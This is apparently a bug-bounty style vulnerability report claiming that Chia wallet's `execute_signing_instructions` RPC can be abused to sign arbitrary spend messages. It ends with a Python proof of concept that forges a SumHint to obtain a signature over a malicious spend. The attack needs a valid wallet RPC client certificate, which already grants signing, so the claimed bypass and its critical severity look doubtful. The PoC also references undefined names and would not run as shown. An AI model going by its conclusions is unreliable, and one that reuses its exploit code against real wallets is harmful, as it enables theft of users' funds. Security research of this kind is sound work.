### Title
Unvalidated `SumHint.synthetic_offset` in `execute_signing_instructions` Enables Arbitrary Message Signing Under Wallet's Own Keys — (`chia/wallet/wallet.py`)

---

### Summary

`Wallet.execute_signing_instructions` unconditionally promotes any caller-supplied `SumHint.synthetic_offset` bytes into a live `PrivateKey` that is inserted into `sk_lookup`, and never verifies that `offset_pk + Σ(component_pks) == final_pubkey`. A caller who can reach the `/execute_signing_instructions` RPC endpoint can therefore supply a crafted `SumHint` whose `synthetic_offset` is the legitimate, publicly-derivable offset for the wallet's own standard coin key, pair it with an attacker-chosen `SigningTarget.message`, and receive back a fully valid BLS signature over that message under the wallet's synthetic public key — sufficient to spend any standard coin the wallet controls.

---

### Finding Description

In `chia/wallet/wallet.py`, `execute_signing_instructions` processes `SumHint` objects as follows:

```python
# lines 594-602
offset_sk = PrivateKey.from_bytes(sum_hint.synthetic_offset)   # ← no validation
offset_pk = offset_sk.get_g1()
pk_lookup[offset_pk.get_fingerprint()] = offset_pk
sk_lookup[offset_pk.get_fingerprint()] = offset_sk             # ← attacker-controlled sk stored
final_pubkey: G1Element = G1Element.from_bytes(sum_hint.final_pubkey)
final_fingerprint: int = final_pubkey.get_fingerprint()
pk_lookup[final_fingerprint] = final_pubkey
sum_hint_lookup[final_fingerprint] = [*fingerprints_we_have, offset_pk.get_fingerprint()]
``` [1](#0-0) 

There is **no check** that `offset_pk + Σ(component_pks) == final_pubkey`. The function then signs for every fingerprint in `sum_hint_lookup[pk_fingerprint]`, which includes both the wallet's own `root_sk` and the attacker-supplied `offset_sk`:

```python
# lines 621-623
for partial_fingerprint in sum_hint_lookup[pk_fingerprint]:
    signatures.append(
        AugSchemeMPL.sign(sk_lookup[partial_fingerprint], target.message, pk_lookup[pk_fingerprint])
    )
``` [2](#0-1) 

The `synthetic_offset` for the wallet's standard coin key is **fully public**: it is `calculate_synthetic_offset(root_pk, DEFAULT_HIDDEN_PUZZLE_HASH)`, a deterministic SHA-256 computation over the public key and a well-known constant. [3](#0-2) 

The `synthetic_pk = root_pk + G·offset` is also public. An attacker who knows `root_pk` (always public) can therefore construct a `SumHint` that is structurally identical to what `gather_signing_info` would legitimately produce, but with an attacker-chosen `SigningTarget.message`.

The RPC endpoint is registered without any additional authorization gate beyond the wallet's SSL client-certificate layer: [4](#0-3) [5](#0-4)

### Impact Explanation

The wallet produces `AugSchemeMPL.aggregate([sign(root_sk, msg, synthetic_pk), sign(offset_sk, msg, synthetic_pk)])`. Because `synthetic_pk = root_pk + offset_pk` (the math holds when the attacker uses the correct public offset), this aggregate is a **valid BLS signature** for `synthetic_pk` over the attacker-chosen `msg`. The attacker can set `msg = delegated_puzzle_hash || coin_id || AGG_SIG_ME_ADDITIONAL_DATA` for any coin locked to `synthetic_pk`, construct the matching spend bundle, and broadcast it — spending the wallet's XCH, CATs, NFTs, or any other standard-coin-locked asset without the owner's consent.

This satisfies: **High/Critical — bypass of wallet authorization enabling unauthorized coin control and signing**.

---

### Likelihood Explanation

- `root_pk` is always public (derivable from the wallet's fingerprint or any on-chain coin).
- `calculate_synthetic_offset` is a deterministic, public computation requiring no secrets.
- `synthetic_pk` is on-chain in every standard coin's puzzle hash.
- The attacker only needs a valid SSL client certificate for the wallet RPC — the same credential used by the CHIP-0028 external-signer flow, the CLI (`chia wallet signer execute_signing_instructions`), and any integrated application.
- No brute force, timing attack, or cryptographic weakness is required.

---

### Recommendation

1. **Enforce the sum invariant**: after computing `offset_pk` and resolving all `fingerprints_we_have` to their public keys, assert `offset_pk + Σ(component_pks) == final_pubkey` before inserting anything into `sk_lookup`. Reject the hint if the check fails.
2. **Do not store `offset_sk` in `sk_lookup` at all**: the offset private key should only be used ephemerally during signing, never persisted in a lookup table that can be targeted by a subsequent `SigningTarget`.
3. Consider whether the `/execute_signing_instructions` endpoint should require an additional confirmation step (e.g., user approval or a nonce tied to a prior `gather_signing_info` call) before signing externally-supplied instructions.

### Proof of Concept

```python
from chia_rs import AugSchemeMPL, G1Element, PrivateKey
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import (
    calculate_synthetic_offset, DEFAULT_HIDDEN_PUZZLE_HASH,
)
from chia.wallet.signer_protocol import (
    KeyHints, SigningInstructions, SigningTarget, SumHint,
)
from chia.wallet.wallet_request_types import ExecuteSigningInstructions

# --- attacker knows root_pk (public) ---
root_pk: G1Element = wallet_rpc.get_public_keys()[0]          # public
root_fingerprint = root_pk.get_fingerprint().to_bytes(4, "big")

offset_int = calculate_synthetic_offset(root_pk, DEFAULT_HIDDEN_PUZZLE_HASH)
offset_bytes = offset_int.to_bytes(32, "big")                 # public computation
offset_sk = PrivateKey.from_bytes(offset_bytes)
synthetic_pk = root_pk + offset_sk.get_g1()                   # wallet's own key

# --- craft malicious spend message ---
malicious_delegated_puzzle_hash = b"\xde\xad" * 16            # sends funds to attacker
coin_id = b"\xca\xfe" * 16                                    # target coin (on-chain)
agg_sig_data = constants.AGG_SIG_ME_ADDITIONAL_DATA
message = malicious_delegated_puzzle_hash + coin_id + agg_sig_data

crafted = SigningInstructions(
    KeyHints(
        sum_hints=[SumHint(
            fingerprints=[root_fingerprint],
            synthetic_offset=offset_bytes,
            final_pubkey=bytes(synthetic_pk),
        )],
        path_hints=[],
    ),
    targets=[SigningTarget(
        fingerprint=synthetic_pk.get_fingerprint().to_bytes(4, "big"),
        message=message,
        hook=b"\x00" * 32,
    )],
)

resp = await wallet_rpc.execute_signing_instructions(
    ExecuteSigningInstructions(signing_instructions=crafted, partial_allowed=False)
)
sig = G2Element.from_bytes(resp.signing_responses[0].signature)

# Verify: this is a valid signature for synthetic_pk over the malicious message
assert AugSchemeMPL.verify(synthetic_pk, message, sig)
# Attacker now constructs spend bundle with malicious_delegated_puzzle and sig → broadcasts
```
